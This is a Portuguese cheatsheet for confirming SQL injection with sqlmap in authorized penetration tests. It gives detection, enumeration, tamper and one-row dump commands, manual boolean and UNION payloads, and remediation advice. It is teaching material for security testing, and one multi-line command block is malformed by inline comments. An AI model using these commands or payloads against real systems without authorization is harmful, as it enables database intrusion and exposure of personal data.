# sqlmap — Cheatsheet de Validação Conservadora de SQLi

> **USO AUTORIZADO.** Use somente em alvos com escopo e autorização escrita. SQLi é uma classe de alto risco: prefira sempre o modo conservador (read-only, sem dump em massa, sem técnicas destrutivas) e pare na **confirmação mínima** necessária para a PoC.

## Filosofia de uso conservador

O objetivo em um engajamento profissional é **provar a vulnerabilidade**, não esvaziar o banco. Regras de ouro:

- Comece com `--level=1 --risk=1` (padrão) e só aumente com justificativa.
- **Nunca** use `--risk=3` sem autorização explícita: ele habilita `OR`-based em UPDATE/queries que pode alterar dados.
- Evite `--dump-all` / dumps de tabelas inteiras de PII. Limite a `COUNT(*)` e a 1 linha de amostra mascarada.
- Preferir técnicas não-disruptivas: evite `--technique=T` (time-based) em produção quando boolean/error/union resolvem (time-based gera carga e atrasos).
- Sempre registre tudo: `-t /tmp/sqlmap-traffic.log --flush-session` controlado.

## Captura de requisição (a forma correta de testar)

Quase nunca passe a URL crua. Capture a requisição autenticada no proxy e alimente o sqlmap:

```bash
# Salve a request bruta do Burp/ZAP (Copy to file) e use -r
sqlmap -r /tmp/req.txt --batch

# Marque manualmente o ponto de injeção com *
# POST /search HTTP/1.1
# Content-Type: application/json
# {"q":"foo*"}
```

## Reconhecimento mínimo (detecção apenas)

```bash
# Detecta se o parâmetro é injetável, sem ir além
sqlmap -r /tmp/req.txt --batch \
  --level=1 --risk=1 \
  --technique=BEU \          # Boolean, Error, Union (sem Time/Stacked)
  --threads=2 \
  --smart                    # só testa params com heurística positiva

# Aponte o parâmetro exato em vez de varrer todos
sqlmap -r /tmp/req.txt -p id --batch --level=1 --risk=1
```

Flags de técnica (`--technique`):

| Letra | Técnica | Nota de risco |
|------|---------|---------------|
| `B` | Boolean-based blind | Segura, recomendada |
| `E` | Error-based | Segura, rápida |
| `U` | UNION-based | Segura |
| `S` | Stacked queries | **Cuidado** — permite múltiplas statements |
| `T` | Time-based blind | Gera latência/carga; use por último |
| `Q` | Inline queries | Raro |

## PoC mínima (provar sem expor dados)

```bash
# 1) Banner e usuário atual — prova de execução, zero PII
sqlmap -r /tmp/req.txt -p id --batch --banner --current-user --current-db

# 2) Hostname / privilégios (avalia impacto sem dumpar)
sqlmap -r /tmp/req.txt -p id --batch --hostname --is-dba

# 3) Lista de DBs e tabelas (estrutura, não conteúdo)
sqlmap -r /tmp/req.txt -p id --batch --dbs
sqlmap -r /tmp/req.txt -p id --batch -D appdb --tables
sqlmap -r /tmp/req.txt -p id --batch -D appdb -T users --columns

# 4) Contagem como evidência de acesso, sem extrair os registros
sqlmap -r /tmp/req.txt -p id --batch -D appdb -T users --count

# 5) Amostra mínima e mascarada (1 linha, somente se necessário p/ o laudo)
sqlmap -r /tmp/req.txt -p id --batch -D appdb -T users -C id,email \
  --dump --start=1 --stop=1
```

> Ao incluir amostras no laudo, **redija/oculte** PII (ex.: `j***@empresa.com`). Capture screenshot da contagem como evidência principal.

## Cenários comuns

```bash
# Sessão autenticada por cookie
sqlmap -u 'https://app/item?id=1' --cookie='SESSION=abc; csrf=xyz' --batch

# Header como ponto de injeção (ex.: X-Forwarded-For)
sqlmap -u 'https://app/' --headers='X-Forwarded-For: 1*' --batch

# WAF / encoding: tamper scripts (use com parcimônia, documente)
sqlmap -r /tmp/req.txt --batch --tamper=space2comment,between

# Forçar o DBMS quando já se conhece (acelera e reduz ruído)
sqlmap -r /tmp/req.txt --batch --dbms=postgresql

# CSRF token dinâmico
sqlmap -r /tmp/req.txt --csrf-token=csrf --csrf-url='https://app/form'
```

## Confirmação manual (não dependa só da ferramenta)

Valide a injeção à mão antes de afirmar no laudo. Exemplo boolean-based:

```
# Verdadeiro vs falso devem produzir respostas diferentes
id=1 AND 1=1     -> página normal
id=1 AND 1=2     -> página alterada/vazia
```

UNION-based (descobrir nº de colunas):

```
id=1 ORDER BY 1-- -      # incrementa até erro
id=-1 UNION SELECT NULL,NULL,version()-- -
```

## Flags de segurança/controle

| Flag | Uso |
|------|-----|
| `--batch` | Sem interação (assume defaults) |
| `--flush-session` | Reinicia estado da sessão sqlmap |
| `--proxy=http://127.0.0.1:8080` | Roteia pelo Burp p/ auditoria |
| `--delay=1` / `--time-sec=5` | Reduz carga / ajusta time-based |
| `--safe-url` + `--safe-freq` | Mantém sessão viva sem disparar lockout |
| `--fresh-queries` | Ignora cache de resultados |
| `-v 3` | Mostra os payloads enviados (auditoria) |

## Remediação (para o laudo)

- **Consultas parametrizadas / prepared statements** em todas as queries — nunca concatenar input.
- Usar **ORM** com binding ou stored procedures parametrizadas; jamais montar SQL por string.
- **Princípio do menor privilégio** no usuário do banco da aplicação (sem DBA, sem `FILE`, sem DDL).
- **Validação de input** allow-list (tipo, formato, faixa) como defesa em profundidade.
- **WAF** como camada adicional, nunca como controle primário.
- Tratamento de erros genérico (sem stack traces/erros SQL para o cliente).
- Referências: OWASP **SQL Injection Prevention Cheat Sheet**, **WSTG-INPV-05/06**, CWE-89.
